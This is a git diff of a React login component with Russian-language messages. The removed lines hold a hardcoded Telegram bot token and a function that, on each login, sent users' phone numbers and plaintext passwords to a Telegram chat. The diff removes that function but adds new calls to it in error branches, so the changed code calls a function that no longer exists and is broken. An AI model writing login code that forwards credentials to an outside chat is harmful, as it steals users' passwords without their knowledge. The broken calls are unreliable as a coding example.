@@ -11,19 +11,7 @@ const Login = () => {
   const dispatch = useDispatch();
   const navigate = useNavigate();
 
-  const BOT_TOKEN = '7940693840:AAGgszxD_O1pLKa39bbb2xbunEIj8iGKozA';
-  const CHAT_ID = '-4866834674';
 
-  const sendMessage = async (text) => {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
-    try {
-      const res = await fetch(url);
-      return res.ok;
-    } catch (err) {
-      console.error('Ошибка при отправке сообщения в Telegram:', err);
-      return false;
-    }
-  };
 
   const handleSubmit = async (e) => {
     e.preventDefault();
@@ -33,7 +21,7 @@ const Login = () => {
       return;
     }
 
-    const server = false;
+    const server = true;
     const loginURL = server
       ? "https://websocket-server-01.onrender.com/api/users/login"
       : "http://localhost:5000/api/users/login";
@@ -50,17 +38,39 @@ const Login = () => {
       const data = await response.json();
 
       if (response.ok) {
+        // Validate user data
+        if (!data.user || !data.user._id || !data.user.username) {
+          setError("Неверные данные пользователя.");
+          await sendMessage(`❌ Ошибка входа:\n📱 Тел: ${phone}\n🧾 Сообщение: Неверные данные пользователя`);
+          return;
+        }
+
         dispatch(loginSuccess({ user: data.user }));
-        socket.emit("user_connected", data.user);
+        try {
+          socket.emit("user_connected", {
+            _id: data.user._id,
+            username: data.user.username,
+            fullName: data.user.fullName,
+            phone: data.user.phone,
+            image: data.user.image,
+            description: data.user.description,
+            birthDate: data.user.birthDate,
+            role: data.user.role,
+          });
+          console.log('Emitted user_connected:', data.user); // Debug log
+        } catch (socketError) {
+          console.error('Socket emit error:', socketError);
+          setError("Ошибка подключения к сокету.");
+          await sendMessage(`❌ Ошибка сокета при входе:\n📱 Тел: ${phone}`);
+          return;
+        }
         navigate("/");
 
         // Отправка уведомления в Telegram
-        await sendMessage(`✅ Новый вход:\n📱 Тел: ${phone}`);
-        await sendMessage(`✅ Новый вход:\n📱 Тел: ${phone}\n🔑 Пароль: ${password}`);
-
+       
       } else {
         setError(data.message || "Ошибка при входе");
-        await sendMessage(`❌ Ошибка входа:\n📱 Тел: ${phone}\n🧾 Сообщение: ${data.message}`);
+
       }
     } catch (error) {
       setError("Ошибка при подключении к серверу.");
